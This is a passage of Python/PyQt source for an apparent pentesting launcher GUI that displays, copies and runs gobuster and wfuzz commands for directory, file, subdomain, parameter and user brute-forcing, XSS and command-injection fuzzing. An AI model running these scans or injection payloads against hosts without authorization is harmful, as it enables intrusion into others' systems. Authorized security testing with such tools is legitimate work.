        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nikto_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        gobusterDir = QtWidgets.QLabel("[+ Gobuster Directory]")
        gobusterDir.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(gobusterDir)
##############################################################################        
        gobusterDir_Scan1 = QtWidgets.QLabel(f"gobuster dir -u http://{rhost}:{rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30")
        gobusterDir_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(gobusterDir_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(gobusterDir_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(gobusterDir_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command12 = gobusterDir_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command12]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(gobusterDir_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        gobusterFile = QtWidgets.QLabel("[+ Gobuster Files]")
        gobusterFile.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(gobusterFile)
##############################################################################        
        gobusterFile_Scan1 = QtWidgets.QLabel(f"gobuster dir -u http://{rhost}:{rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30")
        gobusterFile_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(gobusterFile_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(gobusterFile_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(gobusterFile_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command13 = gobusterFile_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command13]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(gobusterFile_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
############################################################################## 
        gobusterSub = QtWidgets.QLabel("[+ Gobuster for SubDomain Brute Forcing]")
        gobusterSub.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(gobusterSub)
##############################################################################        
        gobusterSub_Scan1 = QtWidgets.QLabel(f"gobuster dns -d domain.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30")
        gobusterSub_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(gobusterSub_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(gobusterSub_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(gobusterSub_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command14 = gobusterSub_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command14]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(gobusterSub_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        wfuzzXSS = QtWidgets.QLabel("[+ Wfuzz XXS Fuzzing]")
        wfuzzXSS.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzXSS)
##############################################################################        
        wfuzzXSS_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt http://{rhost}:{rport}/FUZZ")
        wfuzzXSS_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzXSS_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzXSS_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzXSS_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command15 = wfuzzXSS_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command15]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzXSS_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzXSS_Scan2 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt http://10.11.1.71:80/FUZZ")
        wfuzzXSS_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzXSS_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzXSS_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzXSS_Scan2)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command16 = wfuzzXSS_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command16]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzXSS_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        wfuzzCIPD = QtWidgets.QLabel("[+ Wfuzz Command Injection with Post Data]")
        wfuzzCIPD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzCIPD)
##############################################################################        
        wfuzzCIPD_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt -d doi=FUZZ http://{rhost}:{rport}/FUZZ")
        wfuzzCIPD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzCIPD_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzCIPD_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzCIPD_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command17 = wfuzzCIPD_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command17]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzCIPD_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
############################################################################## 
        wfuzzPE = QtWidgets.QLabel("[+ Wfuzz Testing for Parameter Existence]")
        wfuzzPE.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzPE)
##############################################################################        
        wfuzzPE_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://{rhost}:{rport}/FUZZ")
        wfuzzPE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzPE_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzPE_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzPE_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command18 = wfuzzPE_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command18]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzPE_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
############################################################################## 
        wfuzzAFD = QtWidgets.QLabel("[+ Wfuzz Authenticated Fuzzing Directories")
        wfuzzAFD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzAFD)
##############################################################################        
        wfuzzAFD_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -hc 404 -d \"SESSIONID=value\" \"http://{rhost}:{rport}/FUZZ/\"")
        wfuzzAFD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzAFD_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzAFD_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzAFD_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################       
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command19 = wfuzzAFD_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command19]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzAFD_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
############################################################################## 
        wfuzzAFF = QtWidgets.QLabel("[+ Authenticated File Fuzzing]")
        wfuzzAFF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzAFF)
##############################################################################        
        wfuzzAFF_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -hc 404 -d \"SESSIONID=value\" \"http://{rhost}:{rport}/FUZZ\"")
        wfuzzAFF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzAFF_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzAFF_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzAFF_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################       
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command20 = wfuzzAFF_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command20]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzAFF_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
############################################################################## 
        wfuzzD = QtWidgets.QLabel("[+ Wfuzz Fuzz Directories]")
        wfuzzD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzD)
##############################################################################        
        wfuzzD_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"http://{rhost}:{rport}/FUZZ/\"")
        wfuzzD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzD_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzD_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################       
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command21 = wfuzzD_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command21]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzD_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzD_Scan2 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ/\"")
        wfuzzD_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzD_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzD_Scan2)
        self.container_layout.addLayout(label_layout)
##############################################################################  
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command22 = wfuzzD_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command22]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzD_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzD_Scan3 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"http://{rhost}:{rport}/FUZZ/\"")
        wfuzzD_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzD_Scan3)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan3.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzD_Scan3)
        self.container_layout.addLayout(label_layout)
##############################################################################  
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command23 = wfuzzD_Scan3.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command23]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzD_Scan3)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzD_Scan4 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ/\"")
        wfuzzD_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzD_Scan4)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzD_Scan4.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzD_Scan4)
        self.container_layout.addLayout(label_layout)
##############################################################################  
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command24 = wfuzzD_Scan4.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command24]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzD_Scan4)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################       
        wfuzzF = QtWidgets.QLabel("[+ Wfuzz Fuzz Files]")
        wfuzzF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzF)
##############################################################################        
        wfuzzF_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"http://{rhost}:{rport}/FUZZ\"")
        wfuzzF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzF_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzF_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################       
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command25 = wfuzzF_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command25]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzF_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzF_Scan2 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ\"")
        wfuzzF_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzF_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzF_Scan2)
        self.container_layout.addLayout(label_layout)
##############################################################################  
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command26 = wfuzzF_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command26]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzF_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzF_Scan3 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"http://{rhost}:{rport}/FUZZ\"")
        wfuzzF_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzF_Scan3)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan3.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzF_Scan3)

        self.container_layout.addLayout(label_layout)
##############################################################################  
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command27 = wfuzzF_Scan3.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command27]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzF_Scan3)

        self.container_layout.addLayout(label_layout)
#############################################################################        
        wfuzzF_Scan4 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 --hh 0 \"http://{rhost}:{rport}/FUZZ\"")
        wfuzzF_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzF_Scan4)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzF_Scan4.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wfuzzF_Scan4)

        self.container_layout.addLayout(label_layout)
##############################################################################  
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command28 = wfuzzF_Scan4.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command28]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzF_Scan4)

        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################       
        wfuzzUsers = QtWidgets.QLabel("[+ Wfuzz Users]")
        wfuzzUsers.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wfuzzUsers)
##############################################################################        
        wfuzzUsers_Scan1 = QtWidgets.QLabel(f"wfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt --hc 404,403  \"http://{rhost}:{rport}/FUZZ\"")
        wfuzzUsers_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wfuzzUsers_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wfuzzUsers_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
##############################################################################     
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command29 = wfuzzUsers_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command29]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wfuzzUsers_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
